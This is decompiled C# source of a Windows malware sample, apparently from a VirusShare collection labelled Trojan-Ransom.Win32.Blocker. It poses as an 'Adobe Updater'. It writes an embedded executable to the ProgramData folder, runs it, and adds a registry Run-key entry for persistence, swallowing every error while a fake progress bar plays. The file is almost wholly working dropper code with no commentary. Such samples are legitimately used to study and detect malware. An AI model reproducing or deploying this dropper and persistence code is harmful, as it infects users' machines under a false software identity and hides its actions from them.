// Decompiled with JetBrains decompiler
// Type: WindowsFormsApplication5.Form1
// Assembly: Guncel, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 89137580-C013-4D18-928D-31EAB0609E83
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.chpa-148dd9fdcda3bbf91c3a1d0a85a05b70626f74c15a9efd776b6b72727698ca3d.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace WindowsFormsApplication5
{
  public class Form1 : Form
  {
    private IContainer components = (IContainer) null;
    public static string programDirectory = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
    public static string projectName = "AdobeUpdater_v01";
    public static string sourcePath = Application.ExecutablePath;
    private ProgressBar progressBar1;
    private Label label2;
    private Label label1;

    public Form1()
    {
      try
      {
        string str1 = Form1.programDirectory + "\\" + Form1.projectName + ".exe";
        this.InitializeComponent();
        this.SaveLibrary();
        string str2 = Form1.programDirectory + "\\AdobeUpdater_v01.exe";
        Registry.CurrentUser.OpenSubKey("SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", true).SetValue("Adobe Updater v01", (object) str2);
        Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("Adobe Updater v01", (object) str2);
      }
      catch (Exception ex)
      {
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void process_ac(object sender, EventArgs e)
    {
      this.progressBar1.Value = 0;
      for (int millisecondsTimeout = 0; millisecondsTimeout < 100; ++millisecondsTimeout)
      {
        this.progressBar1.Value = millisecondsTimeout;
        Thread.Sleep(millisecondsTimeout);
      }
      this.label1.Visible = false;
      this.label2.Visible = true;
      this.progressBar1.Visible = false;
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.progressBar1 = new ProgressBar();
      this.label2 = new Label();
      this.label1 = new Label();
      this.SuspendLayout();
      componentResourceManager.ApplyResources((object) this.progressBar1, "progressBar1");
      this.progressBar1.Name = "progressBar1";
      this.progressBar1.Step = 0;
      componentResourceManager.ApplyResources((object) this.label2, "label2");
      this.label2.Name = "label2";
      this.label2.Click += new EventHandler(this.label2_Click);
      componentResourceManager.ApplyResources((object) this.label1, "label1");
      this.label1.Name = "label1";
      componentResourceManager.ApplyResources((object) this, "$this");
      this.AutoScaleMode = AutoScaleMode.Font;
      this.Controls.Add((Control) this.label1);
      this.Controls.Add((Control) this.label2);
      this.Controls.Add((Control) this.progressBar1);
      this.ForeColor = SystemColors.MenuHighlight;
      this.FormBorderStyle = FormBorderStyle.Fixed3D;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.Shown += new EventHandler(this.process_ac);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    public void SaveLibrary()
    {
      try
      {
        using (Stream manifestResourceStream = this.GetType().Assembly.GetManifestResourceStream(Form1.projectName + ".exe"))
        {
          byte[] buffer = new byte[manifestResourceStream.Length];
          manifestResourceStream.Read(buffer, 0, buffer.Length);
          using (Stream stream = (Stream) new FileStream(Form1.programDirectory + "\\" + Form1.projectName + ".exe", FileMode.Create))
            stream.Write(buffer, 0, buffer.Length);
        }
        Process.Start(Form1.programDirectory + "\\" + Form1.projectName + ".exe");
      }
      catch (Exception ex)
      {
      }
    }

    private void linkLabel1_LinkClicked_1(object sender, LinkLabelLinkClickedEventArgs e) => Process.Start("http://www.facebook.com");

    private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e) => Process.Start("http://www.youtube.com");

    private void label2_Click(object sender, EventArgs e)
    {
    }
  }
}
